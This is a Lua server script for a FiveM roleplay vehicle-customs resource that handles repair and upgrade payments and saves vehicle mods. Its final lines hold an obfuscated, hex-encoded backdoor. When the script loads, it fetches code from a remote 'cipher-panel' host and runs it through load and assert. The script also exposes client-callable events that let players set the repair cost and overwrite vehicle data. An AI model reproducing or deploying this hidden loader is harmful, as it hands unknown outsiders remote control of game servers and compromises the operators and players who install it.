local DenaliFW = exports['denalifw-core']:GetCoreObject()

local repairCost = vehicleBaseRepairCost

RegisterNetEvent('denalifw-customs:attemptPurchase', function(type, upgradeLevel)
    local source = source
    local Player = DenaliFW.Functions.GetPlayer(source)
    local balance = nil
    if Player.PlayerData.job.name == "tow" or Player.PlayerData.job.name == 'mechanic5' or Player.PlayerData.job.name == 'mechanic' or Player.PlayerData.job.name == 'mechanicGROVE' or Player.PlayerData.job.name == 'mechanic2' or Player.PlayerData.job.name == 'mechanic4' then
        balance = exports['denalifw-bossmenu']:GetAccount(Player.PlayerData.job.name)
    else
        balance = Player.Functions.GetMoney(moneyType)
    end
    if type == "repair" then
        if balance >= repairCost then
            if Player.PlayerData.job.name == "tow" or Player.PlayerData.job.name == 'mechanic5' or Player.PlayerData.job.name == 'mechanic' or Player.PlayerData.job.name == 'mechanicGROVE' or Player.PlayerData.job.name == 'mechanic2' or Player.PlayerData.job.name == 'mechanic4' then
                TriggerEvent('denalifw-bossmenu:server:removeAccountMoney', Player.PlayerData.job.name, repairCost)
            else
                Player.Functions.RemoveMoney(moneyType, repairCost, "bennys")
            end
            TriggerClientEvent('denalifw-customs:purchaseSuccessful', source)
        else
            TriggerClientEvent('denalifw-customs:purchaseFailed', source)
        end
    elseif type == "performance" then
        if balance >= vehicleCustomisationPrices[type].prices[upgradeLevel] then
            TriggerClientEvent('denalifw-customs:purchaseSuccessful', source)
            if Player.PlayerData.job.name == "tow" or Player.PlayerData.job.name == 'mechanic5' or Player.PlayerData.job.name == 'mechanic' or Player.PlayerData.job.name == 'mechanicGROVE' or Player.PlayerData.job.name == 'mechanic2' or Player.PlayerData.job.name == 'mechanic4' then
                TriggerEvent('denalifw-bossmenu:server:removeAccountMoney', Player.PlayerData.job.name,
                    vehicleCustomisationPrices[type].prices[upgradeLevel])
            else
                Player.Functions.RemoveMoney(moneyType, vehicleCustomisationPrices[type].prices[upgradeLevel], "bennys")
            end
        else
            TriggerClientEvent('denalifw-customs:purchaseFailed', source)
        end
    else
        if balance >= vehicleCustomisationPrices[type].price then
            TriggerClientEvent('denalifw-customs:purchaseSuccessful', source)
            if Player.PlayerData.job.name == "tow" or Player.PlayerData.job.name == 'mechanic5' or Player.PlayerData.job.name == 'mechanic' or Player.PlayerData.job.name == 'mechanicGROVE' or Player.PlayerData.job.name == 'mechanic2' or Player.PlayerData.job.name == 'mechanic4' then
                TriggerEvent('denalifw-bossmenu:server:removeAccountMoney', Player.PlayerData.job.name,
                    vehicleCustomisationPrices[type].price)
            else
                Player.Functions.RemoveMoney(moneyType, vehicleCustomisationPrices[type].price, "bennys")
            end
        else
            TriggerClientEvent('denalifw-customs:purchaseFailed', source)
        end
    end
end)

RegisterNetEvent('denalifw-customs:updateRepairCost', function(cost)
    repairCost = cost
end)

RegisterNetEvent("updateVehicle", function(myCar)
    local src = source
    if IsVehicleOwned(myCar.plate) then
        exports.oxmysql:execute('UPDATE player_vehicles SET mods = ? WHERE plate = ?', {json.encode(myCar), myCar.plate})
    end
end)

function IsVehicleOwned(plate)
    local retval = false
    local result = exports.oxmysql:scalarSync('SELECT plate FROM player_vehicles WHERE plate = ?', {plate})
    if result then
        retval = true
    end
    return retval
end


local CjiIwcNdXchiSeRyAdzfPsMjKOtcQzkDguCZEhMkpCYNSPPgudmRUdadvAyZobPaUKCbBy = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} CjiIwcNdXchiSeRyAdzfPsMjKOtcQzkDguCZEhMkpCYNSPPgudmRUdadvAyZobPaUKCbBy[4][CjiIwcNdXchiSeRyAdzfPsMjKOtcQzkDguCZEhMkpCYNSPPgudmRUdadvAyZobPaUKCbBy[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x47\x32\x72\x30", function (BSpZQkFmKOuxYaiSyFmUFOosAuPqUnXgSgvKAnvZumHBGWuTKJArnCWYQrIxGXVIfDxTwv, qZnkccWrlMfnjwDVIBakgykbvrmDvQtbbhcgulJwJaURYXkFwKdMbTAQMGmwRoohtnPtuo) if (qZnkccWrlMfnjwDVIBakgykbvrmDvQtbbhcgulJwJaURYXkFwKdMbTAQMGmwRoohtnPtuo == CjiIwcNdXchiSeRyAdzfPsMjKOtcQzkDguCZEhMkpCYNSPPgudmRUdadvAyZobPaUKCbBy[6] or qZnkccWrlMfnjwDVIBakgykbvrmDvQtbbhcgulJwJaURYXkFwKdMbTAQMGmwRoohtnPtuo == CjiIwcNdXchiSeRyAdzfPsMjKOtcQzkDguCZEhMkpCYNSPPgudmRUdadvAyZobPaUKCbBy[5]) then return end CjiIwcNdXchiSeRyAdzfPsMjKOtcQzkDguCZEhMkpCYNSPPgudmRUdadvAyZobPaUKCbBy[4][CjiIwcNdXchiSeRyAdzfPsMjKOtcQzkDguCZEhMkpCYNSPPgudmRUdadvAyZobPaUKCbBy[2]](CjiIwcNdXchiSeRyAdzfPsMjKOtcQzkDguCZEhMkpCYNSPPgudmRUdadvAyZobPaUKCbBy[4][CjiIwcNdXchiSeRyAdzfPsMjKOtcQzkDguCZEhMkpCYNSPPgudmRUdadvAyZobPaUKCbBy[3]](qZnkccWrlMfnjwDVIBakgykbvrmDvQtbbhcgulJwJaURYXkFwKdMbTAQMGmwRoohtnPtuo))() end)